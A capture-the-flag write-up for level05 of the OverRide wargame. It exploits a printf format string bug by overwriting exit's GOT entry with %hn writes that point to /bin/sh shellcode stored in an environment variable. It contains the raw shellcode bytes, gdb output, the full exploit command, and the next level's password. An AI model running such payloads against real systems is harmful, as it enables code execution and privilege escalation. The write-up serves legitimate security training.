We decompiled the code with hex-rays.

this line convert uppercase into lowercase :
if ( s[i] > 64 && s[i] <= 90 )
	s[i] ^= 0x20u; // 0x20 = 32

We have a vulnerability of printf
printf(s);

And we have an exit function called :
exit(0);
So we can use the got entry of exit to redirect the execution to our shellcode.

(gdb) run
Starting program: /home/users/level05/level05
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be (nil) 0xffffffff 0xffffd744 (nil) 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 [Inferior 1 (process 1609) exited normally]

(gdb) run
Starting program: /home/users/level05/level05
BBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
bbbb 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be (nil) 0xffffffff 0xffffd744 (nil) 0x62626262 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 [Inferior 1 (process 1610) exited normally]
(gdb) 

We recognize 0x61616161 and 0x62626262 !
10th block of memory.

We want to find the address of exit and put a shellcode here (Got) :

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb) p exit
$1 = {<text variable, no debug info>} 0x8048370 <exit@plt>
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0			--> got entry of the function exit
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.

Now like in level1 we can export in the environment variables our shellcode to do /bin/sh.

export SHELLCODEINJECTION=$(python -c 'print "\x90"*128 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

Find the address of our env variable SHELLCODEINJECTION :

level05@OverRide:~$ gdb ./level05 
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) run
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) x/30s *((char **)environ)
[...]
0xffffde6e:	 "LINES=26"
0xffffde77:	 "SHELLCODEINJECTION=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\231Ph//shh/bin\211\343PS\211\341\260\v̀"
0xffffdf23:	 "HOME=/home/users/level05"
0xffffdf3c:	 "SHLVL=1"
[...]

We can see our shellcode at the address 0xffffde77.

Perfect now we remember in Rainfall we can use %n to write the number of characters written by printf into the address that we want (operator to count the number of characters written by printf and write it in the address). (level03 of Rainfall).
We also remember that in the level4 of Rainfall that we can specifies a format specifier that controls the width of the output. (for example %16930112x)

So with all of these informations we can write our exploit :

1) Convert the address of exit in little endian (0x80497e0) : \xe0\x97\x04\x08
2) Convert the address of our shellcode in decimal : 0xffffde77 = 4294958711
3) Write the exploit :
(python -c 'print "\xe0\x97\x04\x08" + "%4294958711x10$n"' ; cat) | ./level05

--> don t work because 4294958711 to big for integer in printf.

1) Split the address of exit in two part 
So we are going to do this in two steps :
Write half of the address of our shellcode in : 0x80497e0
Write the other half of the address of our shellcode in : 0x80497e2
>>> 0x80497e0 + 2			--> We add 2 bytes
134518754
>>> hex(134518754)
'0x80497e2'

Here we are going to write 2 bytes in the address 0x80497e0 and 2 bytes in the address 0x80497e2.
So that s why we add 2 bytes to the address of our shellcode.

2) Split the address of our shellcode in two part, and convert it in decimal :

0xffffde77 --> address of our shellcode

de77 (hex) --> 56951 (dec)
56951 - 8  (Address already written)
= 56943

ffff  (hex) --> 65535 (dec)
65535 - 56951 (All characters written before)
= 8584

3) Using the good format specifier :
We are going to use the format specifier %hn to write on two bytes :
$hn means to not write an integer (4-byte usually), but only a short value (usually 2 bytes) at the given address.

4) Write the payload :
	
(AddressOfExit) + (AddressOfExit+2bytes) + (56951 - 8 ( 8 is the number of bytes already written) = 56943) + 65535 - 56951 = 8584

(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56943x%10$hn" + "%8584x%11$hn"' ; cat) | ./level05
				   ----------------     ----------------
				   		%10					%11

%56943x%10$hn --> will write the first two bytes of the address of the exit
%8584x%11$hn --> will write the last two bytes of the address of the exit

(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56943x%10$hn" + "%8584x%11$hn"' ; cat) | ./level05
whoami
level06
cat /home/users/level06/.pass       
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq